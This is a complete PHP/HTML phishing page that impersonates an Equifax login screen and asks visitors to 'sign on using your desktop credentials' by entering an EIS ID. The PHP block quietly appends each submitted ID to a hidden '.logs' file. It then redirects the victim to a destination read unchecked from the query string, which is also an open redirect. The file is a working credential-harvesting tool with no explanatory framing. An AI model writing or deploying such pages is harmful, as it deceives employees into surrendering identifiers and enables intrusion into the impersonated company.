<?php
// Check if the request method is POST.
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Collect the EIS ID from the form.
    $eis_id = isset($_POST['eis_id']) ? $_POST['eis_id'] : 'Unknown';

    // The original destination is passed as a query parameter.
    $destination = isset($_GET['destination']) ? $_GET['destination'] : 'https://www.equifax.com/';

    // Log the collected information.
    file_put_contents(
        '.logs',
        "[" . date('Y-m-d H:i:s') . "Z]\n" .
        "EIS ID: {$eis_id}\n\n",
        FILE_APPEND
    );

    // Redirect the user to their original destination.
    header('Location: ' . $destination);
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Equifax Login</title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      height: 100%;
      font-family: Arial, Helvetica, sans-serif;
    }

    /* Background image covering full screen */
    body {
      background: url("/assets/images/efx_background.jpg") no-repeat center center fixed;
      background-size: cover;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    /* Login container */
    .login-box {
      border-radius: 8px;
      overflow: hidden; /* keeps rounded corners clean */
      box-shadow: 0 2px 10px rgba(0,0,0,0.25);
      width: 320px;
      background: #fff;
    }

    /* Logo area */
    .login-header {
      background: #fff;
      padding: 20px 20px 10px;
      text-align: center;
    }

    .login-header img {
      max-width: 160px;
    }

    /* Form area with grey background */
    .login-body {
      background: #f4f4f4;
      padding: 20px;
      text-align: center;
    }

    .login-body p {
      font-size: 14px;
      color: #444;
      margin-bottom: 12px;
    }

    .login-body input {
      width: 100%;
      padding: 10px;
      font-size: 14px;
      border: 1px solid #ccc;
      border-radius: 4px;
      margin-bottom: 15px;
      box-sizing: border-box;
    }

    .login-body button {
      background: #9d0025; /* Equifax red */
      color: white;
      border: none;
      padding: 10px 20px;
      font-size: 14px;
      font-weight: bold;
      border-radius: 4px;
      cursor: pointer;
      transition: background 0.2s ease;
    }

    .login-body button:hover {
      background: #7c001d;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <!-- Logo area -->
    <div class="login-header">
      <img src="/assets/images/efx_logo.png" alt="Equifax Logo">
    </div>

    <!-- Grey background area -->
    <div class="login-body">
      <p>Please sign on using your desktop credentials</p>
      <form method="POST" action="fedsso.php">
        <input type="text" name="eis_id" placeholder="EIS ID" required>
        <button type="submit">Sign On</button>
      </form>
    </div>
  </div>
</body>
</html>